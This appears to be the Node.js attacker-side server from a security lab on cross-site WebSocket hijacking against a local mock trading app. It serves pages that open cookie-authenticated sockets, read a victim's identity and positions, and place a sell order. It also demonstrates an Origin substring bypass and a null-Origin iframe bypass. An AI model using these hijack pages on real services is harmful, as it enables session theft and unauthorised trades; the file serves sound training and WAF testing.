/**
 * Foreign origin for the CSWSH lab.
 * Pages here open WebSockets to Harbor Markets; the browser supplies sid.
 */
const http = require('http');
const { URL } = require('url');

const PORT = Number(process.env.PORT || 3699);
const TARGET = process.env.TARGET_WS || 'ws://127.0.0.1:3600';
const WAF_TARGET = process.env.WAF_WS || 'ws://127.0.0.1:8680';

function page(title, body) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>${title}</title>
  <style>
    body { font-family: Georgia, serif; max-width: 860px; margin: 2rem auto; background: #1c0a0a; color: #f5eaea; line-height: 1.5; }
    a { color: #fca5a5; }
    code { font-family: Consolas, ui-monospace, monospace; }
    .btn { display: inline-block; margin: 0.4rem 0.4rem 0.4rem 0; padding: 0.4rem 0.8rem; background: #7f1d1d; color: #fff; text-decoration: none; border-radius: 4px; }
    #out { background: #111; color: #fecaca; padding: 0.8rem 1rem; min-height: 10rem; white-space: pre-wrap; font-family: Consolas, monospace; font-size: 0.86rem; }
    .note { border-left: 4px solid #f59e0b; padding: 0.6rem 0.8rem; background: #3f1d0a; }
  </style>
</head>
<body>
  <p><a href="/">Attacker origin :${PORT}</a></p>
  ${body}
</body>
</html>`;
}

function hijackScript(defaultUrl) {
  return `
    <label>WebSocket URL</label>
    <p><input id="url" style="width:100%;max-width:520px;padding:0.35rem" value="${defaultUrl}" /></p>
    <p>
      <button class="btn" id="go" type="button">Hijack (positions + sell)</button>
    </p>
    <div id="out">idle</div>
    <script>
      function log(s) {
        const el = document.getElementById('out');
        el.textContent += (typeof s === 'string' ? s : JSON.stringify(s)) + '\\n';
      }
      document.getElementById('go').onclick = function () {
        const url = document.getElementById('url').value.trim();
        const out = document.getElementById('out');
        out.textContent = 'connecting ' + url + ' from origin ' + location.origin + '\\n';
        let ws;
        try { ws = new WebSocket(url); }
        catch (e) { log(String(e)); return; }
        ws.onopen = function () {
          log('open — browser sent this origin’s WebSocket handshake with Harbor cookies if they apply');
          ws.send(JSON.stringify({ op: 'whoami' }));
          ws.send(JSON.stringify({ op: 'positions' }));
          ws.send(JSON.stringify({ op: 'order', side: 'sell', symbol: 'HBR', qty: 400 }));
        };
        ws.onmessage = function (ev) { log(ev.data); };
        ws.onerror = function () { log('error (refused or blocked)'); };
        ws.onclose = function (ev) {
          log('close ' + ev.code + ' ' + (ev.reason || ''));
          try {
            const httpUrl = url.replace(/^ws/i, 'http').replace(/^wss/i, 'https');
            fetch(httpUrl, { credentials: 'include' }).then(function (r) {
              return r.text().then(function (t) { log('HTTP ' + r.status + '\\n' + t); });
            }).catch(function (e) { log(String(e)); });
          } catch (e) { log(String(e)); }
        };
      };
    </script>
  `;
}

const server = http.createServer((req, res) => {
  if (req.url === '/health') {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('ok');
    return;
  }

  const path = new URL(req.url, 'http://attacker.local').pathname;
  let html = '';

  if (path === '/' || path === '/index.html') {
    html = page(
      'CSWSH attacker',
      `
      <h1>Evil origin — CSWSH</h1>
      <p>This site is <code>${'http://127.0.0.1:' + PORT}</code>, not Harbor Markets.
      If you already signed in at <code>http://127.0.0.1:3600</code>, opening a socket
      to the desk steals the session <em>without</em> reading cookies in JavaScript.</p>
      <p>
        <a class="btn" href="/hijack">Classic hijack (/ws/desk)</a>
        <a class="btn" href="/bypass">Origin substring (/ws/quotes)</a>
        <a class="btn" href="/iframe">Null Origin iframe (/ws/iframe)</a>
      </p>
      <p class="note">Against the WAF VIP, point the hijack URL at <code>${WAF_TARGET}/ws/desk</code>
      — the upgrade should be <strong>403</strong>.</p>
    `
    );
  } else if (path === '/hijack' || path === '/hijack.html') {
    html = page(
      'CSWSH classic hijack',
      `
      <h1>Classic CSWSH — /ws/desk</h1>
      <p>No Origin check. Cookie is the only authenticator.</p>
      ${hijackScript(`${TARGET}/ws/desk`)}
    `
    );
  } else if (path === '/bypass' || path === '/bypass.html') {
    html = page(
      'CSWSH origin bypass',
      `
      <h1>Weak Origin — /ws/quotes</h1>
      <p>The quotes socket only checks <code>Origin.includes('harbor')</code>.
      A browser on this origin cannot spoof Origin, so the live button uses the
      real page origin (and should fail). The CLI sends
      <code>Origin: http://evil-harbor.lab</code>.</p>
      ${hijackScript(`${TARGET}/ws/quotes`)}
    `
    );
  } else if (path === '/iframe' || path === '/iframe.html') {
    html = page(
      'CSWSH null Origin',
      `
      <h1>Null Origin — sandboxed iframe</h1>
      <p>The iframe channel accepts <code>Origin: null</code> (sandbox without
      <code>allow-same-origin</code>). Cookies on a cross-site null initiator
      may be withheld by modern Chrome; the CLI always sends <code>Origin: null</code>
      plus <code>sid</code>.</p>
      <iframe sandbox="allow-scripts" src="/iframe-child" style="width:100%;height:280px;border:1px solid #7f1d1d;background:#111"></iframe>
    `
    );
  } else if (path === '/iframe-child') {
    html = `<!DOCTYPE html>
<html><body style="background:#111;color:#fecaca;font-family:monospace">
<pre id="out">iframe origin should be null\n</pre>
<script>
  document.getElementById('out').textContent += 'document.origin=' + document.origin + '\\n';
  const ws = new WebSocket(${JSON.stringify(`${TARGET}/ws/iframe`)});
  ws.onopen = function () {
    document.getElementById('out').textContent += 'open\\n';
    ws.send(JSON.stringify({ op: 'whoami' }));
  };
  ws.onmessage = function (ev) { document.getElementById('out').textContent += ev.data + '\\n'; };
  ws.onerror = function () { document.getElementById('out').textContent += 'error\\n'; };
  ws.onclose = function (ev) { document.getElementById('out').textContent += 'close ' + ev.code + '\\n'; };
</script>
</body></html>`;
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('not found');
    return;
  }

  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
  res.end(html);
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`[attacker] CSWSH pages on ${PORT} → ${TARGET}`);
});
